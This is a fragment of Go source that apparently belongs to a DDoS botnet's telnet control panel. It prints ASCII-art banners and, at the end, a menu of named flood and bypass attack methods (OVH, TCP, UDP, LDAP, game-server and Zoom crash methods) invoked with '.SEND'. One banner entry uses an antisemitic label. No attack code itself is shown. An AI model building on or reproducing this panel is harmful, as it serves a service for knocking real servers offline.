            this.conn.Write([]byte("\033[1;49;32m                                   ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                                   ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                      \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                                   ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                      \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ╔═════════════════\033[1;49;32m════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞GOOGLE - google b\033[1;49;32manner1            ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞MESSIAH - messiah ba\033[1;49;32mnner           ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞VOLTAGE -  voltage ba\033[1;49;32mnner          ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞APOLLO -  apollo ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞DOOM -  doom ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞HYBRID -  hybrid ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞XANAX -  xanax ba\033[1;49;32mnner              ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞ICED -  iced ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞JEWS -  jews ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞MICKEY -  mickey ba\033[1;49;32mnner            ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞OWARI -  owari ba\033[1;49;32mnner              ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞XEON -  xeon ba\033[1;49;32mnner                ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ║ ⮞KRONUS Banners 2⮞                  \033[1;49;32m║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                       ╚═════════════════\033[1;49;32m════════════════════╝\033[0m \r\n"))
			
			continue
        }//BANNERS
if err != nil || cmd == "nezuko" || cmd == "NEZUKO" {
this.conn.Write([]byte("\033[2J\033[1H")) //header
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠍⢁⠄⠻⠟⠄⠄⠄⠄⠄⠄⠄⠙⠿⠿⠋⠄⠄⠄⠄⠄⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠶⣶⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣽⣿⠟⠄⠄⠄⠄⣀⣤⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡀⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢻⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⣔⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣀⣤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠹⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⠏⠏⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⠻⣿⣿⣿⣿⣷⠄⠄⠻⣿⣧⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣶⣶⣷⢹⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣳⠄⠄⣈⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⢝⣿⣿⣿⡆⠄⠄⠈⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⢘⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣳⠇⠄⠠⠖⠉⠌⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡽⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣄⠄⠄⠄⠄⠄⢸⠘⣾\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣷⣿⠄⠄⢠⣿⣀⣄⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣽⣿⡀⠄⠄⠄⠄⠄⠄⡠⣺⣿⣿⣿⠗⠄⠄⠄⠄⢸⡇⢹\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡿⣿⠄⢠⢘⣷⣿⣻⣿⣿⣿⣿⣿⣿⡿⠿⠑⠬⠈⢙⣽⣿⣿⣿⣿⣿⣧⠄⠄⠄⢀⠦⠄⣚⠉⠉⠁⠄⠄⠄⠄⠄⠄⢸⡇⢸\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⠿⡅⣹⡇⢠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠁⢘⢟⣿⣿⣿⡟⠄⠄⠄⠈⠉⠁⢻⣦⠄⠄⠄⠄⠄⠄⠄⠄⣸⡇⣸\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⢏⣾⡇⣿⠄⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⣷⣔⢀⣀⡀⠸⣿⣿⠟⠄⠄⠄⠄⠄⠄⠄⠄⠿⣷⡀⠄⠄⠄⢀⣠⣦⣿⡟⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣏⣿⣿⡇⣿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣿⡟⠸⡿⠅⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠂⠄⠄⠙⠛⠛⣿⣹⡇\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⢹⣿⣿⡇⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⣭⣭⣵⡶⣣⡞⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣇⣽⠃\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣼⣿⣿⣿⡀⠸⣿⣿⣿⣟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣾⠏⠄⠄⠄⠄⠄⠰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣸⣿⠏⢰\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⠄⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣡⣿⠏⠄⠄⠄⠄⠄⠄⡾⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿⣰⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡃⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⠏⠄⠄⠄⠄⠄⠄⠄⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡄⢹⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⡇⠄⠈⠙⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⠁⠘⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣟⣿⢀⡇⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠂⠄⠉⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⣧⠄⢻⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⢯⣿⣿⢸⡇⠄⡄⠄⠄⠄⠄⠄⠄⠄⢳⡄⣀⣤⣶⣾⣿⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣆⢿⣷⠄⢻\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⢸⡇⢸⠁⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⡇⠆⠄⠄⠄⠄⠄⠄⢠⣴⣶⠟⠄⠄⢀⣤⣤⣤⠄⠄⠄⠄⠸⢿⡘⣿⣷⡀\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣷⣿⣿⢸⡇⣸⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⡿⣣⡐⠄⠄⠄⠄⠄⠄⠙⠛⠁⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠈⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡌⡇⡇⠄⢀⠄⠄⠄⠄⠄⢀⣶⡷⢻⣿⡿⣟⣵⣿⣿⣧⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢣⠈⠻⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⠄⠁⢰⣿⠁⠄⠄⠄⠄⣿⣿⢹⢸⢿⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢢⣾⠄⠑\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                     NEZUKO CUTE AF  \r\n"))				  
	     continue
        }			  
				  if cmd == "GOOGLE" || cmd == "google" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[32m                               ,,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   .g8'''bgd                               \x1b[32m`7MM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m .dP'     `M                                 \x1b[32mMM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m dM'       `   \x1b[31m,pW'Wq.   \x1b[33m,pW'Wq.   \x1b[34m.P'Ybmmm  \x1b[32mMM  \x1b[31m.gP'Ya      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM           \x1b[31m6W'   `Wb \x1b[33m6W'   `Wb \x1b[34m:MI  I8    \x1b[32mMM \x1b[31m,M'   Yb      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM.    `7MMF'\x1b[31m8M     M8 \x1b[33m8M     M8  \x1b[34mWmmmP'    \x1b[32mMM \x1b[31m8M''''''      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m `Mb.     MM  \x1b[31mYA.   ,A9 \x1b[33mYA.   ,A9 \x1b[34m8M         \x1b[32mMM \x1b[31mYM.    ,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   `'bmmmdPY   \x1b[31m`Ybmd9'   \x1b[33m`Ybmd9'   \x1b[34mYMMMMMb \x1b[32m.JMML.\x1b[31m`Mbmmd'      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                         6'     dP      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                          Ybmmmd'      \r\n"))
            continue
        }
        if cmd == "MESSIAH" || cmd == "messiah" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[33m      `.▄▄ · ▄▄▌▄▄▄█..▄▄█·`.▄▄█·`·▀`·▄▄▄▌·`▄ .▄▌·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m       `██▌`▐██·█▄.▀·▐█ ▀.·▐█ ▀.·██·▐█·▀█ ██·▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m      '·█▌█ █▐█·█▀▀·▄▄▀▀▀█▄▄▀▀▀█▄▐█·▄█▀▀█·██▀▐█ `     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·`▐█▌▐█▌▐█▌██▄▄▌▐█▄·▐█▐█▄·▐█▐█▌▐█`·█▌██▌▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·▐▀▀· ▀` ▀▀.▀▀▀·`▀▀▀▀▌·▀▀▀▀`▀▀▀▐▀`·▀·▀▀▀▐▀▀·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╔═══════════════════════════════════════════════╗   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - - - - -\x1b[1;36mHakai \x1b[1;33mx \x1b[1;36mBlade\x1b[0m- - - - - - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - \x1b[1;33mType \x1b[1;36mHELP \x1b[1;33mfor \x1b[1;36mCommands List \x1b[0m- - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╚═══════════════════════════════════════════════╝   \x1b[0m    \r\n"))
            continue
        }

        if cmd == "VOLTAGE" || cmd == "voltage" {
        	this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\x1b[33m                                                                                 \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m          ,/     \r\n"))    
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m╗   \x1b[33m██\x1b[0m╗ \x1b[33m██████\x1b[0m╗ \x1b[33m██\x1b[0m╗  \x1b[33m████████\x1b[0m╗ \x1b[33m█████\x1b[0m╗  \x1b[33m██████\x1b[0m╗ \x1b[33m███████\x1b[0m╗ \x1b[33m        ,'/      \r\n")) 
	    this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m╔═══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m║  ╚══\x1b[33m██\x1b[0m╔══╝\x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m╔════╝ \x1b[33m██\x1b[0m╔════╝ \x1b[33m      ,' /       \r\n")) 
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m███████\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m███\x1b[0m╗\x1b[33m█████\x1b[0m╗   \x1b[33m    ,'  /_____,  \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m╚\x1b[33m██\x1b[0m╗ \x1b[33m██\x1b[0m╔╝\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m ██\x1b[0m║\x1b[33m██\x1b[0m╔══╝   \x1b[33m  .'____    ,'   \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m ╚\x1b[33m████\x1b[0m╔╝ ╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║  \x1b[33m██\x1b[0m║╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗ \x1b[33m       /  ,'     \r\n")) 
		this.conn.Write([]byte("\x1b[0m        ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ \x1b[33m      / ,'       \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m     /,'         \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m    /'           \r\n"))
            continue
        }
		if err != nil || cmd == "APOLLO" || cmd == "apollo" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\t   \x1b[0;34m .d8b. \x1b[0;37m d8888b.\x1b[0;34m  .d88b. \x1b[0;37m db     \x1b[0;34m db      \x1b[0;37m  .d88b.  \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34md8' `8b\x1b[0;37m 88  `8D\x1b[0;34m .8P  Y8.\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m .8P  Y8. \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88ooo88\x1b[0;37m 88oodD'\x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88~~~88\x1b[0;37m 88~~~  \x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88   88\x1b[0;37m 88     \x1b[0;34m `8b  d8'\x1b[0;37m 88booo.\x1b[0;34m 88booo. \x1b[0;37m `8b  d8' \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34mYP   YP\x1b[0;37m 88     \x1b[0;34m  `Y88P' \x1b[0;37m Y88888P\x1b[0;34m Y88888P \x1b[0;37m  `Y88P'  \r\n"))
			this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
        if cmd == "doom" || cmd == "DOOM" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;31m        d8888b.  .d88b.   .d88b.  .88b  d88.        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;31m        88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        88  .8D `8b  d8' `8b  d8' 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        Y8888D'  `Y88P'   `Y88P'  YP  YP  YP        \r\n"))
            continue
        }
        if err != nil || cmd == "cayosin" || cmd == "CAYOSIN" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;36m                 ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[00;0m                 ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[0;90m                 ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
            continue
		}
		if err != nil || cmd == "HYBRID" || cmd == "hybrid" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;31mUsername\x1b[0;37m: \033[0m" + username + "\r\n"))
			this.conn.Write([]byte("\r\x1b[0;31mPassword\x1b[0;37m: **********\033[0m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m     [\x1b[0;31mようこそ\x1b[0;37m] HYBRID BUILD ONE - KNOWLEDGE IS POWER [\x1b[0;31mようこそ\x1b[0;37m]        \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m   ▄█    █▄    ▄██   ▄   ▀█████████▄     ▄████████  ▄█  ████████▄   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ██▄   ███    ███   ███    ███ ███  ███   ▀███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███▄▄▄███   ███    ███   ███    ███ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███  ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▀▀███▀▀▀▀███▀  ▄██   ███ ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███▌ ███    ███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███   ███   ███    ██▄ ▀███████████ ███  ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ███   ███    ███   ███    ███ ███  ███   ▄███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    █▀     ▀█████▀  ▄█████████▀    ███    ███ █▀   ████████▀   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m                                         ███    ███                 \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
        if err != nil || cmd == "timeout" || cmd == "TIMEOUT" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;35m             \r\n"))
            this.conn.Write([]byte("\033[1;30m             \r\n\033[0m"))
            this.conn.Write([]byte("\033[1;92m            ████████\033[95m╗\033[92m██\033[95m╗\033[92m███\033[95m╗   \033[92m███\033[95m╗\033[92m███████\033[95m╗ \033[92m██████\033[95m╗ \033[92m██\033[95m╗   \033[92m██\033[95m╗\033[92m████████\033[95m╗      \r\n"))
            this.conn.Write([]byte("\033[1;95m            ╚══██╔══╝██║████╗ ████║██╔════╝██╔═══██╗██║   ██║╚══██╔══╝      \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m╔\033[92m████\033[95m╔\033[92m██\033[95m║\033[92m█████\033[95m╗  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║╚\033[92m██\033[95m╔╝\033[92m██\033[95m║\033[92m██\033[95m╔══╝  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))    
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033]95m║\033[92m ██\033[95m║ ╚═╝ \033[92m██\033[95m║\033[92m███████\033[95m╗╚\033[92m██████\033[95m╔╝╚\033[92m██████\033[95m╔╝   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;95m               ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝         \r\n"))
            this.conn.Write([]byte("\033[1;92m             \r\n"))
            this.conn.Write([]byte("\x1b[0;37m             \r\n\x1b[0m"))
            continue
        }  
			if err != nil || cmd == "api" || cmd == "API" || cmd == "apis" || cmd == "apimethod" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                  ╦╔═ ╦═╗ ╔═╗ ╦═╗ ╦ ╦ ╔═╗       ╔═╗╔═╗╦      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ╠╩╗ ╟╦╝ ║ ║ ║ ║ ║ ║ ╚═╗  ───  ╠═╣╠═╝║  ──  ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ╩ ╩ ╩╚═ ╚═╝ ╩ ╩ ╚═╝ ╚═╝       ╩ ╩╩  ╩      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ╔═════════════════╗ ╔═════════════════╗ ╔═════════════════╗╔═════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          ║ OVH-KAZUTO      ║ ║ R6-DROP FN-LAG  ║ ║ DEDIPATH-SAS    ║║ KILLALLV2       ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          ║ OVH-SINON       ║ ║ UDPHEX FIVEM-LAG║ ║ SERVERV2 WRA-XV ║║ WEBSERVER-DEATH ║\033[0m \r\n"))        
            this.conn.Write([]byte("\033[1;49;35m          ║ OVH-YUI         ║ ║ FN-FREEZE DVR   ║ ║ HYDRA-SLAP      ║║ TCP-ACK TCP-FRAG║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          ╚════════╦════════╝ ╚════════╦════════╝ ╚════════╦════════╝╚════════╦════════╝\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ╔════════╩════════╗ ╔════════╩════════╗ ╔════════╩════════╗╔════════╩════════╗\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║ 100UP-BERNHARD  ║ ║ OVH-NAT NFO-RAIL║ ║ VPN-CLAP AURA   ║║ 100UP-STCP      ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║ OVH-STCP        ║ ║ OVH-KILLERV4    ║ ║ NFO-RIOT ARK-255║║ OVH-MULTI       ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║ OVH-CRUSHV2     ║ ║ OVH-KIRITO      ║ ║ TCP-DEATH       ║║                 ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ╚════════╦════════╝ ╚════════╦════════╝ ╚════════╦════════╝╚════════╦══╦═════╝\033[0m \r\n"))                                                                        
			this.conn.Write([]byte("\033[1;49;35m          ╔════════╩════════╗ ╔════════╩════════╗ ╔════════╩════════╗         ║  ║     ║\033[0m \r\n"))                                                                       
			this.conn.Write([]byte("\033[1;49;35m          ║ LDAP UDP-KILL   ║ ║ GAME-DROP       ║ ║                 ║         ║  ║     ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║ VSE STD         ║ ║ TCP-FUCK        ║ ║ Syntax: .SEND   ║         ║  ║     ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║                 ║ ║ UDPBYPASS       ║ ║                 ║═════════╝  ║     ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ║--HOME METHODS-- ║ ║ ZOOM-CRASH      ║ ║                 ║            ║     ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ╚════════╦════════╝ ╚════════╦════════╝ ╚════════╦════════╝            ║     ║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m          ╔════════╩═══════════════════╩═══════════════════╩════════╗            ║     ║\033[0m \r\n"))                                                                     
